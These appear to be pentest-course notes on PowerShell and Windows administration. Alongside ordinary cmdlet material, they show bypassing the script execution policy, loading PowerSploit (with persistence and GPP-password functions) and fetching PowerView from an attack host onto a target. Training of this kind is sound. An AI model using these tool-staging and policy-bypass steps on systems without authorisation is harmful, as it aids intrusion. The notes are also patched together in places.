ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     1.1.0      PSSQLite                            {Invoke-SqliteBulkCopy, Invoke-SqliteQuery, New-SqliteConn...


    Directory: C:\Program Files\WindowsPowerShell\Modules
Questions:


ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     1.0.1      Microsoft.PowerShell.Operation.V... {Get-OperationValidation, Invoke-OperationValidation}
Binary     1.0.0.1    PackageManagement                   {Find-Package, Get-Package, Get-PackageProvider, Get-Packa...
Script     3.4.0      Pester                              {Describe, Context, It, Should...}
Script     1.0.0.1    PowerShellGet                       {Install-Module, Find-Module, Save-Module, Update-Module...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Set-PSReadLineKeyHandler, Remov...
```

The `-ListAvailable` modifier will show us all modules we have installed but not loaded into our session.

We have already transferred the desired module or scripts onto a target Windows host. We will then need to run them. We can start them through the use of the `Import-Module` cmdlet.
#### Using Import-Module

The [Import-Module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module?view=powershell-7.2) cmdlet allows us to add a module to the current PowerShell session.

All About Cmdlets and Modules

```powershell-session
PS C:\Users\htb-student> Get-Help Import-Module

NAME
    Import-Module

SYNOPSIS
    Adds modules to the current session.


SYNTAX
    Import-Module [-Assembly] <System.Reflection.Assembly[]> [-Alias <System.String[]>] [-ArgumentList
    <System.Object[]>] [-AsCustomObject] [-Cmdlet <System.String[]>] [-DisableNameChecking] [-Force] [-Function
    <System.String[]>] [-Global] [-NoClobber] [-PassThru] [-Prefix <System.String>] [-Scope {Local | Global}]
    [-Variable <System.String[]>] [<CommonParameters>]

    Import-Module [-Name] <System.String[]> [-Alias <System.String[]>] [-ArgumentList <System.Object[]>]
    [-AsCustomObject] [-CimNamespace <System.String>] [-CimResourceUri <System.Uri>] -CimSession
    <Microsoft.Management.Infrastructure.CimSession> [-Cmdlet <System.String[]>] [-DisableNameChecking] [-Force]
    [-Function <System.String[]>] [-Global] [-MaximumVersion <System.String>] [-MinimumVersion <System.Version>]
    [-NoClobber] [-PassThru] [-Prefix <System.String>] [-RequiredVersion <System.Version>] [-Scope {Local | Global}]
    [-Variable <System.String[]>] [<CommonParameters>]

<SNIP>
```

To understand the idea of importing the module into our current PowerShell session, we can attempt to run a cmdlet (`Get-NetLocalgroup`) that is part of PowerSploit. We will get an error message when attempting to do this without importing a module. Once we successfully import the PowerSploit module (it has been placed on the target host's Desktop for our use), many cmdlets will be available to us, including Get-NetLocalgroup. See this in action in the clip below:

#### Importing PowerSploit.psd1

All About Cmdlets and Modules

```powershell-session
PS C:\Users\htb-student\Desktop\PowerSploit> Import-Module .\PowerSploit.psd1
PS C:\Users\htb-student\Desktop\PowerSploit> Get-NetLocalgroup

ComputerName GroupName                           Comment
------------ ---------                           -------
WS01         Access Control Assistance Operators Members of this group can remotely query authorization attributes a...
WS01         Administrators                      Administrators have complete and unrestricted access to the compute...
WS01         Backup Operators                    Backup Operators can override security restrictions for the sole pu...
WS01         Cryptographic Operators             Members are authorized to perform cryptographic operations.
WS01         Distributed COM Users               Members are allowed to launch, activate and use Distributed COM obj...
WS01         Event Log Readers                   Members of this group can read event logs from local machine
WS01         Guests                              Guests have the same access as members of the Users group by defaul...
WS01         Hyper-V Administrators              Members of this group have complete and unrestricted access to all ...
WS01         IIS_IUSRS                           Built-in group used by Internet Information Services.
WS01         Network Configuration Operators     Members in this group can have some administrative privileges to ma...
WS01         Performance Log Users               Members of this group may schedule logging of performance counters,...
WS01         Performance Monitor Users           Members of this group can access performance counter data locally a...
WS01         Power Users                         Power Users are included for backwards compatibility and possess li...
WS01         Remote Desktop Users                Members in this group are granted the right to logon remotely
WS01         Remote Management Users             Members of this group can access WMI resources over management prot...
WS01         Replicator                          Supports file replication in a domain
WS01         System Managed Accounts Group       Members of this group are managed by the system.
WS01         Users                               Users are prevented from making accidental or intentional system-wi...
```

## Execution Policy

An essential factor to consider when attempting to use PowerShell scripts and modules is [PowerShell's execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2). As outlined in Microsoft's official documentation, an execution policy is not a security control. It is designed to give IT admins a tool to set parameters and safeguards for themselves.

#### Execution Policy's Impact

All About Cmdlets and Modules

```powershell-session
PS C:\Users\htb-student\Desktop\PowerSploit> Import-Module .\PowerSploit.psd1

Import-Module : File C:\Users\Users\htb-student\PowerSploit.psm1
cannot be loaded because running scripts is disabled on this system. For more information, see
about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ Import-Module .\PowerSploit.psd1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
```

The host's execution policy makes it so that we cannot run our script. We can get around this, however. First, let us check our execution policy settings.
#### Checking Execution Policy State

All About Cmdlets and Modules

```powershell-session
PS C:\htb> Get-ExecutionPolicy 

Restricted  
```

Our current setting restricts what the user can do. If we want to change the setting, we can do so with the `Set-ExecutionPolicy` cmdlet.

#### Setting Execution Policy

All About Cmdlets and Modules

```powershell-session
PS C:\htb> Set-ExecutionPolicy undefined 
```
#### Change Execution Policy By Scope

All About Cmdlets and Modules

```powershell-session
PS C:\htb> Set-ExecutionPolicy -scope Process 
PS C:\htb> Get-ExecutionPolicy -list

Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process          Bypass
  CurrentUser       Undefined
 LocalMachine          Bypass  
```

```
https://www.netspi.com/blog/technical-blog/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/
```

### Calling Cmdlets and Functions From Within a Module

If we wish to see what aliases, cmdlets, and functions an imported module brought to the session, we can use `Get-Command -Module <modulename>` to enlighten us.

#### Using Get-Command

All About Cmdlets and Modules

```powershell-session
PS C:\htb> Get-Command -Module PowerSploit

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           Invoke-ProcessHunter                               3.0.0.0    PowerSploit
Alias           Invoke-ShareFinder                                 3.0.0.0    PowerSploit
Alias           Invoke-ThreadedFunction                            3.0.0.0    PowerSploit
Alias           Invoke-UserHunter                                  3.0.0.0    PowerSploit
Alias           Request-SPNTicket                                  3.0.0.0    PowerSploit
Alias           Set-ADObject                                       3.0.0.0    PowerSploit
Function        Add-Persistence                                    3.0.0.0    PowerSploit
Function        Add-ServiceDacl                                    3.0.0.0    PowerSploit
Function        Find-AVSignature                                   3.0.0.0    PowerSploit
Function        Find-InterestingFile                               3.0.0.0    PowerSploit
Function        Find-LocalAdminAccess                              3.0.0.0    PowerSploit
Function        Find-PathDLLHijack                                 3.0.0.0    PowerSploit
Function        Find-ProcessDLLHijack                              3.0.0.0    PowerSploit
Function        Get-ApplicationHost                                3.0.0.0    PowerSploit
Function        Get-GPPPassword                                    3.0.0.0    PowerSploit
```

`Active Directory` (AD) is a directory service for Windows environments that provides a central point of management for `users`, computers, `groups`, network devices, `file shares`, group policies, `devices`, and trusts with other organizations.


#### Creating A New User

User and Group Management

```powershell-session
PS C:\htb>  New-LocalUser -Name "JLawrence" -NoPassword

Name      Enabled Description
----      ------- -----------
JLawrence True
```
```powershell-session
PS C:\htb> Set-LocalUser -Name "JLawrence" -Password $Password -Description "CEO EagleFang"
PS C:\htb> Get-LocalUser  

Name               Enabled Description
----               ------- -----------
Administrator      False   Built-in account for administering the computer/domain
DefaultAccount     False   A user account managed by the system.
demo               True
Guest              False   Built-in account for guest access to the computer/domain
JLawrence          True    CEO EagleFang
```
#### Adding a Member To a Group

User and Group Management

```powershell-session
PS C:\htb> Add-LocalGroupMember -Group "Remote Desktop Users" -Member "JLawrence"
PS C:\htb> Get-LocalGroupMember -Name "Remote Desktop Users" 

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        DESKTOP-B3MFM77\JLawrence Local
```

The table below lists the commonly used cmdlets used when dealing with objects in PowerShell.

#### Common Commands Used for File & Folder Management

|**Command**|**Alias**|**Description**|
|---|---|---|
|`Get-Item`|gi|Retrieve an object (could be a file, folder, registry object, etc.)|
|`Get-ChildItem`|ls / dir / gci|Lists out the content of a folder or registry hive.|
|`New-Item`|md / mkdir / ni|Create new objects. ( can be files, folders, symlinks, registry entries, and more)|
|`Set-Item`|si|Modify the property values of an object.|
|`Copy-Item`|copy / cp / ci|Make a duplicate of the item.|
|`Rename-Item`|ren / rni|Changes the object name.|
|`Remove-Item`|rm / del / rmdir|Deletes the object.|
|`Get-Content`|cat / type|Displays the content within a file or object.|
|`Add-Content`|ac|Append content to a file.|
|`Set-Content`|sc|overwrite any content in a file with new data.|
|`Clear-Content`|clc|Clear the content of the files without deleting the file itself.|
|`Compare-Object`|diff / compare|Compare two or more objects against each other. This includes the object itself and the content within.|
#### Filtering on Properties

Finding & Filtering Content

```powershell-session
PS C:\htb> Get-LocalUser * | Select-Object -Property Name,PasswordLastSet

Name               PasswordLastSet
----               ---------------
Administrator
DefaultAccount
Guest
MTanaka              1/27/2021 2:39:55 PM
WDAGUtilityAccount 1/18/2021 7:40:22 AM
```
#### Using the Pipeline to Count Unique Instances

Finding & Filtering Content

```powershell-session
PS C:\htb> get-process | sort | unique | measure-object

Count             : 113  
```

#### Getting Help (Services)

Working with Services

```powershell-session
PS C:\htb> Get-Help *-Service  

Name                              Category  Module                    Synopsis
----                              --------  ------                    --------
Get-Service                       Cmdlet    Microsoft.PowerShell.Man… …
New-Service                       Cmdlet    Microsoft.PowerShell.Man… …
Remove-Service                    Cmdlet    Microsoft.PowerShell.Man… …
Restart-Service                   Cmdlet    Microsoft.PowerShell.Man… …
Resume-Service                    Cmdlet    Microsoft.PowerShell.Man… …
Set-Service                       Cmdlet    Microsoft.PowerShell.Man… …
Start-Service                     Cmdlet    Microsoft.PowerShell.Man… …
Stop-Service                      Cmdlet    Microsoft.PowerShell.Man… …
Suspend-Service                   Cmdlet    Microsoft.PowerShell.Man… …
```
#### Get-Service

Working with Services

```powershell-session
PS C:\htb> Get-Service | ft DisplayName,Status 

DisplayName                                                                         Status
-----------                                                                         ------

Adobe Acrobat Update Service                                                       Running
OpenVPN Agent agent_ovpnconnect                                                    Running
Adobe Genuine Monitor Service                                                      Running
Adobe Genuine Software Integrity Service                                           Running
Application Layer Gateway Service                                                  Stopped
Application Identity                                                               Stopped
Application Information                                                            Running
Application Management                                                             Stopped
App Readiness                                                                      Stopped
Microsoft App-V Client                                                             Stopped
AppX Deployment Service (AppXSVC)                                                  Running
AssignedAccessManager Service                                                      Stopped
Windows Audio Endpoint Builder                                                     Running
Windows Audio                                                                      Running
ActiveX Installer (AxInstSV)                                                       Stopped
GameDVR and Broadcast User Service_172433                                          Stopped
BitLocker Drive Encryption Service                                                 Running
Base Filtering Engine                                                              Running
<SNIP> 

PS C:\htb> Get-Service | measure  

Count             : 321

```
#### Precision Look at Defender

Working with Services

```powershell-session
PS C:\htb> Get-Service | where DisplayName -like '*Defender*' | ft DisplayName,ServiceName,Status

DisplayName                                             ServiceName  Status
-----------                                             -----------  ------
Windows Defender Firewall                               mpssvc      Running
Windows Defender Advanced Threat Protection Service     Sense       Stopped
Microsoft Defender Antivirus Network Inspection Service WdNisSvc    Running
Microsoft Defender Antivirus Service                    WinDefend   Stopped
```
#### Resume / Start / Restart a Service/Stop

Working with Services

```powershell-session
PS C:\htb> Start-Service WinDefend
```
As we ran the cmdlet `Start-Service` as long as we did not get an error message like `"ParserError: This script contains malicious content and has been blocked by your antivirus software."` or others, the command executed successfully. We can check again by querying the service.

#### Checking Our Work

Working with Services

```powershell-session
PS C:\htb>  get-service WinDefend

Status   Name               DisplayName
------   ----               -----------
Running  WinDefend          Microsoft Defender Antivirus Service
```
#### Set-Service

Working with Services

```powershell-session
PS C:\htb> get-service spooler | Select-Object -Property Name, StartType, Status, DisplayName

Name    StartType  Status DisplayName
----    ---------  ------ -----------
spooler Automatic Stopped Totally still used for Print Spooling...


PS C:\htb> Set-Service -Name Spooler -StartType Disabled

PS C:\htb> Get-Service -Name Spooler | Select-Object -Property StartType 

StartType
---------
 Disabled

```
#### Remotely Query Services

Working with Services

```powershell-session
PS C:\htb> get-service -ComputerName ACADEMY-ICL-DC

Status   Name               DisplayName
------   ----               -----------
Running  ADWS               Active Directory Web Services
Stopped  AppIDSvc           Application Identity
Stopped  AppMgmt            Application Management
Stopped  AppReadiness       App Readiness
Stopped  AppXSvc            AppX Deployment Service (AppXSVC)
Running  BFE                Base Filtering Engine
Stopped  BITS               Background Intelligent Transfer Ser...
<SNIP>  
```
#### Filtering our Output

Working with Services

```powershell-session
PS C:\htb> Get-Service -ComputerName ACADEMY-ICL-DC | Where-Object {$_.Status -eq "Running"}

Status   Name               DisplayName
------   ----               -----------
Running  ADWS               Active Directory Web Services
Running  BFE                Base Filtering Engine
Running  COMSysApp          COM+ System Application
Running  CoreMessagingRe... CoreMessaging
Running  CryptSvc           Cryptographic Services
Running  DcomLaunch         DCOM Server Process Launcher
Running  Dfs                DFS Namespace
Running  DFSR               DFS Replication
```
### Registry Key Files

A host systems Registry `root keys` are stored in several different files and can be accessed from `C:\Windows\System32\Config\`. Along with these Key files, registry hives are held throughout the host in various other places.
#### Hive Breakdown

| **Name**            | **Abbreviation** | **Description**                                                                                                                                                                                                                                                                                                          |
| ------------------- | ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| HKEY_LOCAL_MACHINE  | `HKLM`           | This subtree contains information about the computer's `physical state`, such as hardware and operating system data, bus types, memory, device drivers, and more.                                                                                                                                                        |
| HKEY_CURRENT_CONFIG | `HKCC`           | This section contains records for the host's `current hardware profile`. (shows the variance between current and default setups) Think of this as a redirection of the [HKLM](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc739525\(v=ws.10\)) CurrentControlSet profile key. |
| HKEY_CLASSES_ROOT   | `HKCR`           | Filetype information, UI extensions, and backward compatibility settings are defined here.                                                                                                                                                                                                                               |
| HKEY_CURRENT_USER   | `HKCU`           | Value entries here define the specific OS and software settings for each specific user. `Roaming profile` settings, including user preferences, are stored under HKCU.                                                                                                                                                   |
| HKEY_USERS          | `HKU`            | The `default` User profile and current user configuration settings for the local computer are defined under HKU.                                                                                                                                                                                                         |
## Event Log Categories and Types

The main four log categories include application, security, setup, and system. Another type of category also exists called `forwarded events`.

|Log Category|Log Description|
|---|---|
|System Log|The system log contains events related to the Windows system and its components. A system-level event could be a service failing at startup.|
|Security Log|Self-explanatory; these include security-related events such as failed and successful logins, and file creation/deletion. These can be used to detect various types of attacks that we will cover in later modules.|
|Application Log|This stores events related to any software/application installed on the system. For example, if Slack has trouble starting it will be recorded in this log.|
|Setup Log|This log holds any events that are generated when the Windows operating system is installed. In a domain environment, events related to Active Directory will be recorded in this log on domain controller hosts.|
|Forwarded Events|Logs that are forwarded from other hosts within the same network.|

---

## Event Types

There are five types of events that can be logged on Windows systems:

|Type of Event|Event Description|
|---|---|
|Error|Indicates a major problem, such as a service failing to load during startup, has occurred.|
|Warning|A less significant log but one that may indicate a possible problem in the future. One example is low disk space. A Warning event will be logged to note that a problem may occur down the road. A Warning event is typically when an application can recover from the event without losing functionality or data.|
|Information|Recorded upon the successful operation of an application, driver, or service, such as when a network driver loads successfully. Typically not every desktop application will log an event each time they start, as this could lead to a considerable amount of extra "noise" in the logs.|
|Success Audit|Recorded when an audited security access attempt is successful, such as when a user logs on to a system.|
|Failure Audit|Recorded when an audited security access attempt fails, such as when a user attempts to log in but types their password in wrong. Many audit failure events could indicate an attack, such as Password Spraying.|

---

## Event Severity Levels

Each log can have one of five severity levels associated with it, denoted by a number:

| Severity Level | Level # | Description                                                                                                                                                                                    |
| -------------- | ------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Verbose        | 5       | Progress or success messages.                                                                                                                                                                  |
| Information    | 4       | An event that occurred on the system but did not cause any issues.                                                                                                                             |
| Warning        | 3       | A potential problem that a sysadmin should dig into.                                                                                                                                           |
| Error          | 2       | An issue related to the system or service that does not require immediate attention.                                                                                                           |
| Critical       | 1       | This indicates a significant issue related to an application or a system that requires urgent attention by a sysadmin that, if not addressed, could lead to system or application instability. |
## Interacting with the Windows Event Log - wevtutil

The [wevtutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) command line utility can be used to retrieve information about event logs. It can also be used to export, archive, and clear logs, among other commands.

#### Wevtutil without Parameters

Working with the Windows Event Log

```cmd-session
C:\htb> wevtutil /?

Windows Events Command Line Utility.

Enables you to retrieve information about event logs and publishers, install
and uninstall event manifests, run queries, and export, archive, and clear logs.

Usage:

You can use either the short (for example, ep /uni) or long (for example,
enum-publishers /unicode) version of the command and option names. Commands,
options and option values are not case-sensitive.

Variables are noted in all upper-case.

wevtutil COMMAND [ARGUMENT [ARGUMENT] ...] [/OPTION:VALUE [/OPTION:VALUE] ...]

Commands:

el | enum-logs          List log names.
gl | get-log            Get log configuration information.
sl | set-log            Modify configuration of a log.
ep | enum-publishers    List event publishers.
gp | get-publisher      Get publisher configuration information.
im | install-manifest   Install event publishers and logs from manifest.
um | uninstall-manifest Uninstall event publishers and logs from manifest.
qe | query-events       Query events from a log or log file.
gli | get-log-info      Get log status information.
epl | export-log        Export a log.
al | archive-log        Archive an exported log.
cl | clear-log          Clear a log.

<SNIP>
```

We can use the `el` parameter to enumerate the names of all logs present on a Windows system.
With the `gl` parameter, we can display configuration information for a specific log, notably whether the log is enabled or not, the maximum size, permissions, and where the log is stored on the system.

#### Gathering Log Information

Working with the Windows Event Log

```cmd-session
C:\htb> wevtutil gl "Windows PowerShell"

name: Windows PowerShell
enabled: true
type: Admin
owningPublisher:
isolation: Application
channelAccess: O:BAG:SYD:(A;;0x2;;;S-1-15-2-1)(A;;0x2;;;S-1-15-3-1024-3153509613-960666767-3724611135-2725662640-12138253-543910227-1950414635-4190290187)(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x7;;;SO)(A;;0x3;;;IU)(A;;0x3;;;SU)(A;;0x3;;;S-1-5-3)(A;;0x3;;;S-1-5-33)(A;;0x1;;;S-1-5-32-573)
logging:
  logFileName: %SystemRoot%\System32\Winevt\Logs\Windows PowerShell.evtx
  retention: false
  autoBackup: false
  maxSize: 15728640
publishing:
  fileMax: 1

```

## Interacting with the Windows Event Log - PowerShell

Similarly, we can interact with Windows Event Logs using the [```
```Get-WinEvent(https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.3)```
``` PowerShell cmdlet. Like with the `wevtutil` examples, some commands require local admin-level access.
#### PowerShell - Listing All Logs

Working with the Windows Event Log

```powershell-session
PS C:\htb> Get-WinEvent -ListLog *

LogMode   MaximumSizeInBytes RecordCount LogName
-------   ------------------ ----------- -------
Circular            15728640         657 Windows PowerShell
Circular            20971520       10713 System
Circular            20971520       26060 Security
Circular            20971520           0 Key Management Service
Circular             1052672           0 Internet Explorer
Circular            20971520           0 HardwareEvents
Circular            20971520        6202 Application
Circular             1052672             Windows Networking Vpn Plugin Platform/Op...
Circular             1052672             Windows Networking Vpn Plugin Platform/Op... 
Circular             1052672           0 SMSApi
Circular             1052672          61 Setup
Circular            15728640          24 PowerShellCore/Operational
Circular             1052672          99 OpenSSH/Operational
Circular             1052672          46 OpenSSH/Admin

<SNIP>
```

#### Filtering for Logon Failures

Working with the Windows Event Log

```powershell-session
PS C:\htb> Get-WinEvent -FilterHashTable @{LogName='Security';ID='4625 '}

   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                      Id LevelDisplayName Message
-----------                      -- ---------------- -------
11/16/2022 2:53:16 PM          4625 Information      An account failed to log on....  
11/16/2022 2:53:16 PM          4625 Information      An account failed to log on.... 
11/16/2022 2:53:12 PM          4625 Information      An account failed to log on.... 
11/16/2022 2:50:36 PM          4625 Information      An account failed to log on.... 
11/16/2022 2:50:29 PM          4625 Information      An account failed to log on.... 
11/16/2022 2:50:21 PM          4625 Information      An account failed to log on....

<SNIP>
```


| **Protocol** | **Description**                                                                                                                                                                                                                                                                                                                                                                    |
| ------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `SMB`        | [SMB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/4287490c-602c-41c0-a23e-140a1f137832) provides Windows hosts with the capability to share resources, files, and a standard way of authenticating between hosts to determine if access to resources is allowed. For other distros, SAMBA is the open-source option.                                     |
| `Netbios`    | [NetBios](https://www.ietf.org/rfc/rfc1001.txt) itself isn't directly a service or protocol but a connection and conversation mechanism widely used in networks. It was the original transport mechanism for SMB, but that has since changed. Now it serves as an alternate identification mechanism when DNS fails. Can also be known as NBT-NS (NetBIOS name service).           |
| `LDAP`       | [LDAP](https://www.rfc-editor.org/rfc/rfc4511) is an `open-source` cross-platform protocol used for `authentication` and `authorization` with various directory services. This is how many different devices in modern networks can communicate with large directory structure services such as `Active Directory`.                                                                |
| `LLMNR`      | [LLMNR](https://www.rfc-editor.org/rfc/rfc4795) provides a name resolution service based on DNS and works if DNS is not available or functioning. This protocol is a multicast protocol and, as such, works only on local links ( within a normal broadcast domain, not across layer three links).                                                                                 |
| `DNS`        | [DNS](https://datatracker.ietf.org/doc/html/rfc1034) is a common naming standard used across the Internet and in most modern network types. DNS allows us to reference hosts by a unique name instead of their IP address. This is how we can reference a website by "WWW.google.com" instead of "8.8.8.8". Internally this is how we request resources and access from a network. |
| `HTTP/HTTPS` | [HTTP/S](https://www.rfc-editor.org/rfc/rfc2818) HTTP and HTTPS are the insecure and secure way we request and utilize resources over the Internet. These protocols are used to access and utilize resources such as web servers, send and receive data from remote sources, and much more.                                                                                        |
| `Kerberos`   | [Kerberos](https://web.mit.edu/kerberos/) is a network level authentication protocol. In modern times, we are most likely to see it when dealing with Active Directory authentication when clients request tickets for authorization to use domain resources.                                                                                                                      |
| `WinRM`      | [WinRM](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) Is an implementation of the WS-Management protocol. It can be used to manage the hardware and software functionalities of hosts. It is mainly used in IT administration but can also be used for host enumeration and as a scripting engine.                                                                 |
| `RDP`        | [RDP](https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/rds-plan-access-from-anywhere) is a Windows implementation of a network UI services protocol that provides users with a Graphical interface to access hosts over a network connection. This allows for full UI use to include the passing of keyboard and mouse input to the remote host.    |
| `SSH`        | [SSH](https://datatracker.ietf.org/doc/html/rfc4251) is a secure protocol that can be used for secure host access, transfer of files, and general communication between network hosts. It provides a way to securely access hosts and services over insecure networks.                                                                                                             |


#### Net Cmdlets

| **Cmdlet**           | **Description**                                                                                           |
| -------------------- | --------------------------------------------------------------------------------------------------------- |
| `Get-NetIPInterface` | Retrieve all `visible` network adapter `properties`.                                                      |
| `Get-NetIPAddress`   | Retrieves the `IP configurations` of each adapter. Similar to `IPConfig`.                                 |
| `Get-NetNeighbor`    | Retrieves the `neighbor entries` from the cache. Similar to `arp -a`.                                     |
| `Get-Netroute`       | Will print the current `route table`. Similar to `IPRoute`.                                               |
| `Set-NetAdapter`     | Set basic adapter properties at the `Layer-2` level such as VLAN id, description, and MAC-Address.        |
| `Set-NetIPInterface` | Modifies the `settings` of an `interface` to include DHCP status, MTU, and other metrics.                 |
| `New-NetIPAddress`   | Creates and configures an `IP address`.                                                                   |
| `Set-NetIPAddress`   | Modifies the `configuration` of a network adapter.                                                        |
| `Disable-NetAdapter` | Used to `disable` network adapter interfaces.                                                             |
| `Enable-NetAdapter`  | Used to turn network adapters back on and `allow` network connections.                                    |
| `Restart-NetAdapter` | Used to restart an adapter. It can be useful to help push `changes` made to adapter `settings`.           |
| `test-NetConnection` | Allows for `diagnostic` checks to be ran on a connection. It supports ping, tcp, route tracing, and more. |

```powershell-session
PS C:\Users\htb-student> Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'

Name  : OpenSSH.Client~~~~0.0.1.0
State : Installed

Name  : OpenSSH.Server~~~~0.0.1.0
State : NotPresent

PS C:\Users\htb-student> Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0

Path          :
Online        : True
RestartNeeded : False

PS C:\Users\htb-student> Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'

Name  : OpenSSH.Client~~~~0.0.1.0
State : Installed

Name  : OpenSSH.Server~~~~0.0.1.0
State : NotPresent

PS C:\Users\htb-student> Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

Path          :
Online        : True
RestartNeeded : False

PS C:\Users\htb-student> Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'

Name  : OpenSSH.Client~~~~0.0.1.0
State : Installed

Name  : OpenSSH.Server~~~~0.0.1.0
State : Installed
```

#### Starting the SSH Service & Setting Startup Type

Once we have confirmed SSH is installed, we can use the [Start-Service](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-service?view=powershell-7.2) cmdlet to start the SSH service. We can also use the [Set-Service](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2) cmdlet to configure the startup settings of the SSH service if we choose.

Networking Management from The CLI

```powershell-session
PS C:\Users\htb-student> Start-Service sshd  
  
PS C:\Users\htb-student> Set-Service -Name sshd -StartupType 'Automatic'  
```
## A Simple Web Request

We can perform a basic Get request of a website using the `-Method GET` modifier with the Invoke-WebRequest cmdlet, as seen below. We will specify the URI as `https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html` for this example. We will also send it to `Get-Member` to inspect the object's output methods and properties.

#### Get Request with Invoke-WebRequest

Interacting With The Web

```powershell-session
PS C:\htb> Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | Get-Member


   TypeName: Microsoft.PowerShell.Commands.HtmlWebResponseObject

----              ---------- ----------
Dispose           Method     void Dispose(), void IDisposable.Dispose()
Equals            Method     bool Equals(System.Object obj)
GetHashCode       Method     int GetHashCode()
GetType           Method     type GetType()
ToString          Method     string ToString()
AllElements       Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection AllElements...
BaseResponse      Property   System.Net.WebResponse BaseResponse {get;set;}
Content           Property   string Content {get;}
Forms             Property   Microsoft.PowerShell.Commands.FormObjectCollection Forms {get;}
Headers           Property   System.Collections.Generic.Dictionary[string,string] Headers {get;}
Images            Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection Images {get;}
InputFields       Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection InputFields...
Links             Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection Links {get;}
ParsedHtml        Property   mshtml.IHTMLDocument2 ParsedHtml {get;}
RawContent        Property   string RawContent {get;set;}
RawContentLength  Property   long RawContentLength {get;}
RawContentStream  Property   System.IO.MemoryStream RawContentStream {get;}
Scripts           Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection Scripts {get;}
StatusCode        Property   int StatusCode {get;}
StatusDescription Property   string StatusDescription {get;}
```
### Downloading PowerView.ps1 from GitHub

We can practice using Invoke-WebRequest by downloading a popular tool used by many pentesters called [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).

#### Download To Our Host

Interacting With The Web

```powershell-session
PS C:\> Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"

PS C:\> dir


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          6/5/2021   5:10 AM                PerfLogs
d-r---         7/25/2022   7:36 AM                Program Files
d-r---          6/5/2021   7:37 AM                Program Files (x86)
d-r---         7/30/2022  10:21 AM                Users
d-----         7/21/2022  11:28 AM                Windows
-a----         8/10/2022   9:12 AM        7299504 PowerView.ps1
```
#### Using ls to View the File (Attack Host)

Interacting With The Web

```shell-session
ninjathebox98w1@htb[/htb]$ ls

Dictionaries            Get-HttpStatus.ps1                    Invoke-Portscan.ps1          PowerView.ps1  Recon.psd1
Get-ComputerDetail.ps1  Invoke-CompareAttributesForClass.ps1  Invoke-ReverseDnsLookup.ps1  README.md      Recon.psm1
```

We start a simple python web server in the directory where PowerView.ps1 is located.

#### Starting the Python Web Server (Attack Host)

Interacting With The Web

```shell-session
ninjathebox98w1@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Then, we would download the hosted file from the attack host using Invoke-WebRequest.

#### Downloading PowerView.ps1 from Web Server (From Attack Host to Target Host)

Interacting With The Web

```powershell-session
Invoke-WebRequest -Uri "http://10.10.14.169:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"
```
### What If We Can't Use Invoke-WebRequest?

So what happens if we are restricted from using `Invoke-WebRequest` for some reason? Not to fear, Windows provides several different methods to interact with web clients. The first and more challenging interaction path is utilizing the [.Net.WebClient](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-7.0) class. This handy class is a .Net call we can utilize as Windows uses and understands .Net. This class contains standard system.net methods for interacting with resources via a URI (web addresses like github.com/project/tool.ps1). Let's look at an example:

#### Net.WebClient Download

Interacting With The Web

```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile("https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")

PS C:\htb> ls

    Directory: C:\Users\MTanaka

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          11/10/2022 10:45 AM      108511752 Bloodhound.zip
